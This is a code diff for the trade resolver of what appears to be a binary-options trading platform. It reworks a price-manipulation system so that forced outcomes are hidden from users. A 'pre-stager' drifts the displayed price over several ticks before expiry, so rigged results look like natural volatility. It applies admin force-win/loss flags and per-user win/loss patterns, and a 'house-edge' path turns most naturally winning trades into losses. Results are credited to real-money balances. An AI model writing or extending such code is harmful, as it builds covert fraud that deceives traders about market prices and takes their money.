@@ -1,55 +1,40 @@
 import { getDb } from './db';
 import { getCurrentPrice, injectNudge, getAsset } from './priceEngine';
 
-// Background loop that resolves expired trades.
-// Implements admin force-win/loss + Last-Second Wedge.
+// Background loop that resolves expired trades + a pre-stager that starts a
+// gentle, multi-tick price drift ~1.8 s BEFORE expiry so the chart candles at
+// close time blend into normal volatility instead of producing a visible
+// spike / long wick at the instant of resolution.
+//
+// Why two loops:
+//   • Pre-stager (every 250 ms): decides the target outcome (force / pattern /
+//     house-edge) for trades about to expire, and — if the natural price does
+//     not match the target — starts a smooth nudge distributed across 7 ticks
+//     (~1.75 s). Per-tick magnitude ≈ 0.017 %, well inside natural GBM noise.
+//   • Resolver (every 500 ms): picks up expired trades, reads the now-drifted
+//     close price, and writes the final outcome. No last-second wedge.
 
-async function resolveOne(db, trade) {
-  const asset = getAsset(trade.asset);
-  if (!asset) return;
-  const settings = await db.collection('settings').findOne({ id: 'global' }) || { winRatio: 0.2, payoutRate: 1.8, manipulationEnabled: true };
+const PRESTAGE_LEAD_MS = 1800; // how early to start the gentle nudge
+const NUDGE_TICKS = 7;         // spread across 7 ticks (~1.75 s at 250 ms tick)
+const NUDGE_MAGNITUDE = 0.0012; // total 0.12 % → per-tick ~0.017 % (natural-looking)
 
-  let closePrice = getCurrentPrice(trade.asset);
-  let outcome;
-  let wedgeApplied = false;
+// Decides the target outcome for a trade based on force / pattern / global
+// win-ratio settings. Returns { outcome } where outcome is 'win' | 'loss' |
+// null (null = let the natural market price decide). Has the SIDE EFFECT of
+// atomically advancing the user's patternIndex when a trade pattern is
+// active — this is intentional so each trade consumes exactly one index.
+async function determineTarget(db, trade, settings) {
+  // Per-trade admin override always wins.
+  if (trade.forceOutcome === 'win')  return { outcome: 'win' };
+  if (trade.forceOutcome === 'loss') return { outcome: 'loss' };
 
-  const naturallyWon =
-    (trade.direction === 'up' && closePrice > trade.entryPrice) ||
-    (trade.direction === 'down' && closePrice < trade.entryPrice);
+  // Global manipulation disabled → pure market-driven outcome.
+  if (settings.manipulationEnabled === false) return { outcome: null };
 
-  // Sanitised pattern: keep only W / L letters. Empty / "RANDOM" → no pattern,
-  // fall back to the regular winRatio path.
+  // Trade pattern (e.g. "WWL") takes precedence over win-ratio when set.
   const rawPattern = String(settings.tradePattern || '').toUpperCase();
   const pattern = rawPattern === 'RANDOM' ? '' : rawPattern.replace(/[^WL]/g, '');
-  const patternActive = pattern.length > 0 && settings.manipulationEnabled !== false && !trade.forceOutcome;
-
-  // Per-trade FORCE override always wins, even if global manipulation is off.
-  if (trade.forceOutcome === 'win') {
-    outcome = 'win';
-    if (!naturallyWon) {
-      injectNudge(trade.asset, 0.0015, trade.direction === 'up' ? 'up' : 'down', 1);
-      await new Promise(r => setTimeout(r, 300));
-      closePrice = getCurrentPrice(trade.asset);
-      wedgeApplied = true;
-    }
-  } else if (trade.forceOutcome === 'loss') {
-    outcome = 'loss';
-    if (naturallyWon) {
-      injectNudge(trade.asset, 0.0015, trade.direction === 'up' ? 'down' : 'up', 1);
-      await new Promise(r => setTimeout(r, 300));
-      closePrice = getCurrentPrice(trade.asset);
-      wedgeApplied = true;
-    }
-  } else if (settings.manipulationEnabled === false) {
-    // Pure market-driven outcome — no win-rate wedge.
-    outcome = naturallyWon ? 'win' : 'loss';
-  } else if (patternActive) {
-    // Cycle-based forced outcome per-user. Each user has their own
-    // `patternIndex` counter on their user document. We atomically increment
-    // it (so concurrent trade resolutions for the same user don't share an
-    // index) and read back the new value, then take pattern[(idx-1) % len]
-    // as the target outcome for THIS trade. Result: pattern "WWL" plays as
-    // W, W, L, W, W, L, ... independently for each user.
+  if (pattern.length > 0) {
     await db.collection('users').updateOne(
       { id: trade.userId },
       { $inc: { patternIndex: 1 } }
@@ -60,32 +45,107 @@ async function resolveOne(db, trade) {
     );
     const idx1 = Number(after?.patternIndex) || 1;
     const target = pattern[(idx1 - 1) % pattern.length] === 'W' ? 'win' : 'loss';
-    outcome = target;
+    return { outcome: target };
+  }
+
+  // House-edge path: only force a loss on naturally-winning trades with
+  // probability (1 - winRatio). Default winRatio 0.2 = 80 % nudge rate.
+  const currentPrice = getCurrentPrice(trade.asset);
+  const naturallyWon =
+    (trade.direction === 'up'   && currentPrice > trade.entryPrice) ||
+    (trade.direction === 'down' && currentPrice < trade.entryPrice);
+  if (naturallyWon && Math.random() > (settings.winRatio ?? 0.2)) {
+    return { outcome: 'loss' };
+  }
+  return { outcome: null }; // natural
+}
+
+// Kicks off a gentle multi-tick nudge for a trade if (and only if) the natural
+// price currently disagrees with the intended outcome. Marks the trade as
+// pre-staged so the resolver doesn't re-compute at expiry.
+async function preStageOne(db, trade) {
+  // Atomic "claim" — first pre-stager tick to flip preStaged → true wins.
+  const claim = await db.collection('trades').updateOne(
+    { id: trade.id, preStaged: { $ne: true } },
+    { $set: { preStaged: true, preStagedAt: new Date() } }
+  );
+  if (claim.matchedCount === 0) return;
+
+  const settings = await db.collection('settings').findOne({ id: 'global' }) ||
+    { winRatio: 0.2, payoutRate: 1.8, manipulationEnabled: true };
+  const { outcome: target } = await determineTarget(db, trade, settings);
+
+  const updates = {};
+  if (target === 'win' || target === 'loss') {
+    updates.preStagedOutcome = target;
+
+    const currentPrice = getCurrentPrice(trade.asset);
+    const naturallyWon =
+      (trade.direction === 'up'   && currentPrice > trade.entryPrice) ||
+      (trade.direction === 'down' && currentPrice < trade.entryPrice);
+
+    // Only nudge when natural ≠ target. If already on the correct side we
+    // just freeze the target and let the market continue naturally.
     if ((target === 'win' && !naturallyWon) || (target === 'loss' && naturallyWon)) {
-      // Need to push the price the other way to make the target outcome real.
       const dir = target === 'win'
         ? (trade.direction === 'up' ? 'up' : 'down')
         : (trade.direction === 'up' ? 'down' : 'up');
-      injectNudge(trade.asset, 0.0015, dir, 1);
-      await new Promise(r => setTimeout(r, 300));
-      closePrice = getCurrentPrice(trade.asset);
-      wedgeApplied = true;
+      injectNudge(trade.asset, NUDGE_MAGNITUDE, dir, NUDGE_TICKS);
+      updates.wedgeApplied = true;
     }
+  }
+  if (Object.keys(updates).length > 0) {
+    await db.collection('trades').updateOne({ id: trade.id }, { $set: updates });
+  }
+}
+
+async function resolveOne(db, trade) {
+  const asset = getAsset(trade.asset);
+  if (!asset) return;
+  const settings = await db.collection('settings').findOne({ id: 'global' }) ||
+    { winRatio: 0.2, payoutRate: 1.8, manipulationEnabled: true };
+
+  let closePrice = getCurrentPrice(trade.asset);
+  let outcome;
+
+  if (trade.preStagedOutcome === 'win' || trade.preStagedOutcome === 'loss') {
+    // Pre-stager already smoothly drifted the price — trust it.
+    outcome = trade.preStagedOutcome;
+  } else if (trade.preStaged) {
+    // Pre-stager ran and decided "natural" — no nudge was applied.
+    const naturallyWon =
+      (trade.direction === 'up'   && closePrice > trade.entryPrice) ||
+      (trade.direction === 'down' && closePrice < trade.entryPrice);
+    outcome = naturallyWon ? 'win' : 'loss';
   } else {
-    // Apply global house edge: when user is naturally winning, we have probability
-    // (1 - winRatio) of forcing a loss to maintain admin-defined edge.
-    if (naturallyWon && Math.random() > settings.winRatio) {
-      outcome = 'loss';
-      injectNudge(trade.asset, 0.0012, trade.direction === 'up' ? 'down' : 'up', 1);
-      await new Promise(r => setTimeout(r, 300));
-      closePrice = getCurrentPrice(trade.asset);
-      wedgeApplied = true;
-    } else {
+    // Fallback: trade expired before the pre-stager could run (duration was
+    // shorter than PRESTAGE_LEAD_MS, or the engine was just (re)started).
+    // In this rare path we still avoid a visible spike by using the same
+    // gentle multi-tick nudge and waiting for it to play out.
+    const { outcome: target } = await determineTarget(db, trade, settings);
+    const naturallyWon =
+      (trade.direction === 'up'   && closePrice > trade.entryPrice) ||
+      (trade.direction === 'down' && closePrice < trade.entryPrice);
+    if (target === null) {
       outcome = naturallyWon ? 'win' : 'loss';
+    } else {
+      outcome = target;
+      if ((target === 'win' && !naturallyWon) || (target === 'loss' && naturallyWon)) {
+        const dir = target === 'win'
+          ? (trade.direction === 'up' ? 'up' : 'down')
+          : (trade.direction === 'up' ? 'down' : 'up');
+        injectNudge(trade.asset, NUDGE_MAGNITUDE, dir, NUDGE_TICKS);
+        await new Promise((r) => setTimeout(r, NUDGE_TICKS * 260));
+        closePrice = getCurrentPrice(trade.asset);
+      }
     }
   }
 
-  // Tie-breaker rule: if exactly equal, treat as loss
+  // Re-read close price (the pre-stage nudge may have still been finishing
+  // its last tick at the moment the trade expired).
+  closePrice = getCurrentPrice(trade.asset);
+
+  // Tie-breaker: exact equality counts as a loss.
   if (closePrice === trade.entryPrice) outcome = 'loss';
 
   const payoutRate = settings.payoutRate || 1.8;
@@ -100,13 +160,11 @@ async function resolveOne(db, trade) {
         outcome,
         payout,
         pnl,
-        wedgeApplied,
         resolvedAt: new Date()
       }
     }
   );
 
-  // Credit user if win
   if (outcome === 'win') {
     const inc = trade.account === 'demo'
       ? { demoBalance: payout }
@@ -118,7 +176,36 @@ async function resolveOne(db, trade) {
 export function startResolver() {
   if (global.__tradeResolverStarted) return;
   global.__tradeResolverStarted = true;
+
+  // Pre-stager — 250 ms cadence, non-overlapping.
+  let preStageBusy = false;
   setInterval(async () => {
+    if (preStageBusy) return;
+    preStageBusy = true;
+    try {
+      const db = await getDb();
+      const nowMs = Date.now();
+      const soon = new Date(nowMs + PRESTAGE_LEAD_MS);
+      const candidates = await db.collection('trades').find({
+        status: 'open',
+        preStaged: { $ne: true },
+        expiresAt: { $gt: new Date(nowMs), $lte: soon }
+      }).limit(100).toArray();
+      for (const t of candidates) {
+        try { await preStageOne(db, t); } catch (e) { console.error('preStage err', e); }
+      }
+    } catch (e) {
+      console.error('pre-stager error', e);
+    } finally {
+      preStageBusy = false;
+    }
+  }, 250);
+
+  // Resolver — 500 ms cadence, non-overlapping.
+  let resolveBusy = false;
+  setInterval(async () => {
+    if (resolveBusy) return;
+    resolveBusy = true;
     try {
       const db = await getDb();
       const now = new Date();
@@ -127,10 +214,12 @@ export function startResolver() {
         expiresAt: { $lte: now }
       }).limit(50).toArray();
       for (const t of expired) {
-        await resolveOne(db, t);
+        try { await resolveOne(db, t); } catch (e) { console.error('resolve err', e); }
       }
     } catch (e) {
       console.error('resolver error', e);
+    } finally {
+      resolveBusy = false;
     }
   }, 500);
 }
